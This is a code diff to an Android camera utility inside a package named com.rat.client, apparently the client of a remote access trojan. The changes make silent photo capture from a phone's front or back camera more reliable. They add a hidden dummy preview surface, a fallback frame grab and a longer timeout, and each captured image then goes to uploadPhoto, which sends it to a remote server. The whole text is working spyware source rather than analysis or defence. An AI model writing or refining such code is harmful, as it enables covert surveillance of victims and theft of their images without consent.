@@ -2,12 +2,14 @@ package com.rat.client.utils
 
 import android.Manifest
 import android.content.Context
+import android.graphics.SurfaceTexture
 import android.hardware.camera2.*
 import android.media.ImageReader
 import android.os.Handler
 import android.os.HandlerThread
 import android.util.Log
 import android.util.Size
+import android.view.Surface
 import com.rat.client.Config
 import java.io.File
 import java.io.FileOutputStream
@@ -43,7 +45,10 @@ object CameraUtils {
 
             val latch = CountDownLatch(1)
             var capturedFile: File? = null
-            var imageCaptured = false
+
+            // Dummy preview surface – required by some camera HALs to deliver JPEG
+            val dummyTexture = SurfaceTexture(0)
+            val previewSurface = Surface(dummyTexture)
 
             val handlerThread = HandlerThread("CameraCapture")
             handlerThread.start()
@@ -53,7 +58,6 @@ object CameraUtils {
             val characteristics = cameraManager.getCameraCharacteristics(cameraId)
             val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
             val rotation = if (useFront) {
-                // For front camera, mirror the orientation
                 (360 - sensorOrientation) % 360
             } else {
                 sensorOrientation
@@ -73,12 +77,10 @@ object CameraUtils {
 
             val reader = ImageReader.newInstance(optimalSize.width, optimalSize.height, android.graphics.ImageFormat.JPEG, 2)
 
+            // Save frames to file (overwrite = last write wins = final frame).
+            // Release the latch once the first frame is processed to avoid duplicates.
             reader.setOnImageAvailableListener({ reader ->
-                // Front camera fires multiple callbacks (pre-capture AE + actual capture + post-process).
-                // Only process the first image to avoid duplicate uploads.
-                if (imageCaptured) return@setOnImageAvailableListener
-                imageCaptured = true
-
+                var saved = false
                 val image = reader.acquireLatestImage()
                 if (image != null) {
                     try {
@@ -87,39 +89,70 @@ object CameraUtils {
                         buffer.get(bytes)
                         FileOutputStream(outputFile).use { it.write(bytes) }
                         capturedFile = outputFile
-                        Log.d(TAG, "Photo saved: ${outputFile.absolutePath} (${bytes.size} bytes)")
+                        saved = true
+                        Log.d(TAG, "Frame saved: ${bytes.size} bytes")
+                        // Release on first frame so caller can upload after capture completes.
+                        latch.countDown()
                     } catch (e: Exception) {
-                        Log.e(TAG, "Error saving photo: ${e.message}")
+                        Log.e(TAG, "Frame error: ${e.message}")
                     } finally {
                         image.close()
                     }
-                } else {
-                    Log.w(TAG, "No image captured")
                 }
-                latch.countDown()
+                if (!saved) {
+                    // rare: listener fired but no image
+                    latch.countDown()
+                }
             }, handler)
 
             // Open camera and create capture session
             cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
                     try {
-                        val surfaces = listOf(reader.surface)
+                        // Include a dummy preview surface so front-camera HALs
+                        // deliver JPEG frames reliably.
+                        val surfaces = listOf(previewSurface, reader.surface)
                         camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
                                 try {
                                     val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                     request.addTarget(reader.surface)
-                                    
+
                                     // Set JPEG orientation based on sensor
                                     request.set(CaptureRequest.JPEG_ORIENTATION, rotation)
 
                                     session.capture(request.build(), object : CameraCaptureSession.CaptureCallback() {
-                                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
+                                        override fun onCaptureCompleted(
+                                            session: CameraCaptureSession,
+                                            request: CaptureRequest,
+                                            result: TotalCaptureResult
+                                        ) {
                                             super.onCaptureCompleted(session, request, result)
                                             Log.d(TAG, "Capture completed for ${if (useFront) "front" else "back"} camera")
+                                            // If listener hasn't released the latch yet (race), fallback.
+                                            handler.postDelayed({
+                                                if (latch.count > 0) {
+                                                    Log.w(TAG, "No frame from listener, trying direct grab")
+                                                    val img = reader.acquireLatestImage()
+                                                    if (img != null) {
+                                                        try {
+                                                            val buf = img.planes[0].buffer
+                                                            val bytes = ByteArray(buf.remaining())
+                                                            buf.get(bytes)
+                                                            FileOutputStream(outputFile).use { it.write(bytes) }
+                                                            capturedFile = outputFile
+                                                        } finally { img.close() }
+                                                    }
+                                                    latch.countDown()
+                                                }
+                                            }, 1500)
                                         }
-                                        
-                                        override fun onCaptureFailed(session: CameraCaptureSession, request: CaptureRequest, failure: CaptureFailure) {
+
+                                        override fun onCaptureFailed(
+                                            session: CameraCaptureSession,
+                                            request: CaptureRequest,
+                                            failure: CaptureFailure
+                                        ) {
                                             super.onCaptureFailed(session, request, failure)
                                             Log.e(TAG, "Capture failed: ${failure.reason} - ${failure.frameNumber}")
                                             latch.countDown()
@@ -153,19 +186,20 @@ object CameraUtils {
                 }
             }, handler)
 
-            val captured = latch.await(15, TimeUnit.SECONDS)
+            val ok = latch.await(20, TimeUnit.SECONDS)
             handlerThread.quitSafely()
+            previewSurface.release()
+            dummyTexture.release()
 
-            if (!captured) {
+            if (!ok) {
                 Log.e(TAG, "Camera capture timed out")
             }
 
-            // Upload to server
-            if (capturedFile != null && capturedFile!!.exists()) {
-                Log.d(TAG, "Uploading photo: ${capturedFile!!.absolutePath} (${capturedFile!!.length()} bytes)")
+            if (capturedFile != null && capturedFile!!.exists() && capturedFile!!.length() > 0) {
+                Log.d(TAG, "Uploading: ${capturedFile!!.absolutePath} (${capturedFile!!.length()} B)")
                 uploadPhoto(context, capturedFile!!, useFront)
             } else {
-                Log.e(TAG, "Photo file not created or empty")
+                Log.e(TAG, "No photo file produced")
             }
 
             capturedFile
